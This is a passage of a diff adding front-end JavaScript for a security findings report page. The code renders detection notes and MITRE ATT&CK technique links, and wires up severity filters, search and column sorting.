+   if(f.detection&&f.detection.length){h+='<div class="lab">Detection</div><ul>';
+     f.detection.forEach(function(d){h+='<li>'+esc(d)+'</li>';});h+='</ul>';}
+   if(f.mitre&&f.mitre.length){h+='<div class="lab">ATT&CK</div><div>';
+     f.mitre.forEach(function(m){h+='<a href="https://attack.mitre.org/techniques/'+m.id.replace(".","/")
+       +'/" target="_blank">'+m.id+'</a> ';});h+='</div>';}
+   return h;
+ }
+ Array.prototype.forEach.call(document.querySelectorAll("#findings .fbtn"),function(b){
+   b.onclick=function(){Array.prototype.forEach.call(document.querySelectorAll("#findings .fbtn"),
+     function(x){x.classList.remove("active");});b.classList.add("active");state.sev=b.dataset.sev;render();};});
+ el("fq").oninput=function(){state.q=this.value;render();};
+ Array.prototype.forEach.call(document.querySelectorAll("#ftab th[data-k]"),function(th){
+   th.onclick=function(){var k=th.dataset.k;if(sortK===k)sortDir=-sortDir;else{sortK=k;sortDir=1;}render();};});
+ render();
+})();
+</script>
+</body></html>
